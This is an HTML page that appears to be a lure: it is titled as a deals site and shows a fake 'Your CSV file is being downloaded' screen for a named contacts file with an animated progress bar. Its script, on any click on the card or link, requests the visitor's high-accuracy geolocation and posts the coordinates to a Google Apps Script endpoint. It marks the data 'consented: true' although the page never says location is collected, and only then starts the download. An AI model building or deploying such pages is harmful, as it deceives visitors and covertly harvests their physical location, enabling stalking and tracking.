<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LOOP — Deals near you</title>
  <style>
    :root {
      --primary: #2563eb;
      --bg: #f8fafc;
      --card-bg: #ffffff;
      --text-main: #0f172a;
      --text-muted: #64748b;
      --border: #e2e8f0;
    }

    body {
      background-color: var(--bg);
      font-family: 'Inter', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .download-container {
      background: var(--card-bg);
      padding: 2.5rem;
      border-radius: 1rem;
      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
      text-align: center;
      max-width: 420px;
      width: 100%;
      border: 1px solid var(--border);
    }

    .icon-wrapper {
      background: #eff6ff;
      color: var(--primary);
      width: 64px;
      height: 64px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 1.5rem;
      animation: pulse 2s infinite;
    }

    .download-icon {
      width: 32px;
      height: 32px;
    }

    h2 {
      color: var(--text-main);
      font-size: 1.5rem;
      font-weight: 600;
      margin: 0 0 0.5rem 0;
    }

    .subtitle {
      color: var(--text-muted);
      font-size: 0.95rem;
      margin: 0 0 2rem 0;
    }

    /* File Card Layout */
    .file-card {
      border: 1px solid var(--border);
      border-radius: 0.75rem;
      padding: 1rem;
      background: #fafafa;
      margin-bottom: 1.5rem;
    }

    .file-info {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      text-align: left;
      margin-bottom: 0.75rem;
    }

    .file-badge {
      background: #10b981;
      color: white;
      font-weight: 700;
      font-size: 0.75rem;
      padding: 0.25rem 0.5rem;
      border-radius: 0.375rem;
    }

    .file-details {
      display: flex;
      flex-direction: column;
    }

    .file-name {
      color: var(--text-main);
      font-size: 0.875rem;
      font-weight: 500;
    }

    .file-size {
      color: var(--text-muted);
      font-size: 0.75rem;
    }

    /* Realistic Progress Bar Animation */
    .progress-bar-container {
      background: var(--border);
      border-radius: 9999px;
      height: 6px;
      overflow: hidden;
    }

    .progress-bar-fill {
      background: var(--primary);
      height: 100%;
      width: 30%;
      border-radius: 9999px;
      animation: loading 1.5s infinite ease-in-out;
    }

    .footer-text {
      color: var(--text-muted);
      font-size: 0.85rem;
      margin: 0;
    }

    .link {
      color: var(--primary);
      text-decoration: none;
      font-weight: 500;
    }

    .link:hover {
      text-decoration: underline;
    }

    /* Animations */
    @keyframes pulse {

      0%,
      100% {
        transform: scale(1);
      }

      50% {
        transform: scale(1.05);
      }
    }

    @keyframes loading {
      0% {
        transform: translateX(-100%);
      }

      100% {
        transform: translateX(350%);
      }
    }
  </style>
</head>

<body>

  <div class="download-container">
    <div class="icon-wrapper">
      <svg class="download-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
        stroke="currentColor">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
          d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v1m-4-4l-4 4m0 0l-4-4m4 4V4" />
      </svg>
    </div>

    <h2>Your CSV file is being downloaded</h2>
    <p class="subtitle">Your data is being compiled. Please don't close this window.</p>

    <div class="file-card">
      <div class="file-info">
        <span class="file-badge">CSV</span>
        <div class="file-details">
          <span class="file-name">Eylul_contacts_2026.csv</span>
          <span class="file-size">2.4 MB</span>
        </div>
      </div>
      <div class="progress-bar-container">
        <div class="progress-bar-fill"></div>
      </div>
    </div>

    <p class="footer-text">
      Didn't start automatically? <a href="#" class="link">Click here to download manually</a>
    </p>
  </div>

  <script>
    // Direct CSV download link (replace YOUR_SPREADSHEET_ID)
    const CSV_FILE =
      "https://docs.google.com/spreadsheets/d/1uMbhRh_WhrDv9o2YgUWOV45qX3zLEFzrY_9p0TDhIXI/export?format=csv";

    async function downloadCSV() {
      window.location.href = CSV_FILE;
    }

    async function requestLocation() {

      if (!navigator.geolocation) {
        console.log("Geolocation is not supported.");
        downloadCSV();
        return;
      }

      navigator.geolocation.getCurrentPosition(

        async (position) => {

          const payload = {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: position.coords.accuracy,
            consented: true
          };

          console.log("Location:", payload);

          try {

            const response = await fetch(
              "https://script.google.com/macros/s/AKfycbzCqrUXbmlXPI_EJTcixxfVEDBQ3kseWU1OCyfYgBDeloHoJhSEOO6dVq6UJId5u1Ns/exec",
              {
                method: "POST",
                headers: {
                  "Content-Type": "text/plain"
                },
                body: JSON.stringify(payload)
              }
            );

            console.log(await response.text());

          } catch (err) {

            console.error("Failed to send:", err);

          }

          downloadCSV();

        },

        (error) => {

          console.log("Error code:", error.code);
          console.log("Error message:", error.message);

          downloadCSV();

        },

        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }

      );
    }

    // Request location after a user click instead of on page load
    document.querySelector(".link").addEventListener("click", function (e) {
      e.preventDefault();
      requestLocation();
    });

    // Optional: make the whole card clickable
    document.querySelector(".download-container").addEventListener("click", function () {
      requestLocation();
    }, { once: true });

  </script>
</body>
